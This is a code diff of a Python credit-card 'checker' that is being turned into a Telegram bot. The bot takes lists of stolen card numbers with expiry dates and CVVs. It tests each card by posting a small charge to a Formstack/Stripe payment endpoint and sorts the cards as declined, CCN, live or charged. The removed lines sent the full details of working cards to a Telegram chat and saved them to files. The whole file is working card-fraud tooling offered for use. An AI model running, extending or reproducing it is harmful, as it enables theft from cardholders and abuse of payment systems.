@@ -2,37 +2,21 @@ import os
 import time
 import requests
 from user_agent import generate_user_agent
+import telebot
 
-# Terminal Colors
-D = '\033[2;32m'
-E = '\033[2;33m'
-R = '\033[2;31m'
-B = '\033[2;36m'
-Lb = '\033[1;33m'
-W = '\033[1;37m'
-X = '\033[1;33m'
-F = '\033[2;32m'
-C = "\033[1;97m"
-
-L = '- - - - - - - - - -Tool By : @INDgurnoorsingh - - - - - - - - - - - -\n'
-print(F + L)
-
-# Load configuration from Render Environment Variables
-tokeen = os.getenv('TELEGRAM_TOKEN')
-tid = os.getenv('TELEGRAM_ID')
-combo_file = os.getenv('COMBO_FILE', 'combo.txt')
-
-if not tokeen or not tid:
-    print(R + "[!] Error: TELEGRAM_TOKEN and TELEGRAM_ID environment variables must be set in Render dashboard!")
+# Load Telegram Bot Token from Render Environment Variables
+TOKEN = os.getenv('TELEGRAM_TOKEN')
+if not TOKEN:
+    print("[!] Error: TELEGRAM_TOKEN environment variable must be set in Render dashboard!")
     exit(1)
 
-print(Lb + f"Using Combo File: {combo_file}")
-print(E + '- - - - - - - - - -Enjoy my friend  - - - - - - - - - - - -\n')
+bot = telebot.TeleBot(TOKEN)
 
-sbt = 0
+@bot.message_handler(commands=['start', 'help'])
+def send_welcome(message):
+    bot.reply_to(message, "Boss, send me your card list (format: `card|mm|yy|cvv`), and I will check them and reply here!")
 
-def chk(crd): 
-    global sbt
+def process_and_reply(crd, chat_id):
     crd = crd.strip()
     if not crd or '|' not in crd:
         return
@@ -217,11 +201,10 @@ def chk(crd):
     try:
         response = requests.post('https://sfapi.formstack.io/FormEngine/EngineFrame/CheckPayment', headers=headers, files=files)
     except Exception as e:
-        print(R + f"Request failed: {e}")
+        bot.send_message(chat_id, f"Request failed for {cn}: {e}")
         return
 
     binn = cn[:6]
-    sbt += 1
     try:
         bin_data = requests.get(f'https://binchk-api.vercel.app/bin={binn}').json()
         brand = bin_data.get('brand', '*')
@@ -233,64 +216,4 @@ def chk(crd):
         brand, type, bank, cnt, emj = ['*' for x in range(5)]
         
     if 'declined' in response.text or 'card number is incorrect.' in response.text or 'Sorry, we do not accept this' in response.text or 'expiration' in response.text:
-        print(X + f'[ {sbt} ] - ' + R + f'{cn}|{mm}|{yy}|{cvv} -> Declined ❌')
-        
-    elif 'security code is incorrect.' in response.text:
-        print(X + f'[ {sbt} ] - ' + F + f'{cn}|{mm}|{yy}|{cvv} -> CCN ✅')
-        requests.get(f'''https://api.telegram.org/bot{tokeen}/sendMessage?chat_id={tid}&text=CCN ✅
-━━━━━━━━━━━━━━━━           
-[↯] CC ⇾ {cn}|{mm}|{yy}|{cvv}
-[↯] GATES: STRIPE CHARGE 1$
-[↯] RESPONSE: security code is incorrect. 🟢
-━━━━━━━━━━━━━━━━━
-[↯] BIN: {binn} - {brand} - {type} 
-[↯] ISSUER: {bank}
-[↯] COUNTRY: {cnt} {emj}
-[↯] TIME: 3s
-━━━━━━━━━━━━━━━━━
-[↯] Bot By ⇾ @INDgurnoorsingh''')
-        with open('visa_CCN.txt', 'a') as f_out:
-            f_out.write(f'{cn}|{mm}|{yy}|{cvv}\n')
-        
-    elif 'Your card could not be' in response.text:
-        print(X + f'[ {sbt} ] - ' + F + f'{cn}|{mm}|{yy}|{cvv} -> Live ✅')
-        requests.get(f'''https://api.telegram.org/bot{tokeen}/sendMessage?chat_id={tid}&text=Approved ✅
-━━━━━━━━━━━━━━━━           
-[↯] CC ⇾ {cn}|{mm}|{yy}|{cvv}
-[↯] GATES: STRIPE CHARGE 1$
-[↯] RESPONSE: Your card cannot be prepaid. 🟢
-━━━━━━━━━━━━━━━━━
-[↯] BIN: {binn} - {brand} - {type} 
-[↯] ISSUER: {bank}
-[↯] COUNTRY: {cnt} {emj}
-[↯] TIME: 3s
-━━━━━━━━━━━━━━━━━
-[↯] Bot By ⇾ @XMANSPEAKS''')
-        with open('visa_Live.txt', 'a') as f_out:
-            f_out.write(f'{cn}|{mm}|{yy}|{cvv}\n')
-        
-    else:
-        print(X + f'[ {sbt} ] - ' + F + f'{cn}|{mm}|{yy}|{cvv} -> CHARGE ✅')
-        requests.get(f'''https://api.telegram.org/bot{tokeen}/sendMessage?chat_id={tid}&text=CHARGE ✅
-━━━━━━━━━━━━━━━━           
-[↯] CC ⇾ {cn}|{mm}|{yy}|{cvv}
-[↯] GATES: STRIPE CHARGE 1$
-[↯] RESPONSE: Thank you for your order. 🟢
-━━━━━━━━━━━━━━━━━
-[↯] BIN: {binn} - {brand} - {type} 
-[↯] ISSUER: {bank}
-[↯] COUNTRY: {cnt} {emj}
-[↯] TIME: 3s
-━━━━━━━━━━━━━━━━━
-[↯] Bot By ⇾ @INDgurnoorsingh''')
-        with open('visa_Charge_1$.txt', 'a') as f_out:
-            f_out.write(f'{cn}|{mm}|{yy}|{cvv}\n')
-
-if os.path.exists(combo_file):
-    with open(combo_file, 'r') as f_in:
-        for crd in f_in.readlines():
-            chk(crd)
-            time.sleep(3)
-else:
-    print(R + f"[!] Combo file '{combo_file}' not found in the project directory. Please upload your combo file to GitHub.")
-  
+        bot.send_message(chat_id, f"❌ Declined: `{cn}|{mm}|{yy}|{cvv}`", parse_mode="Markdown")
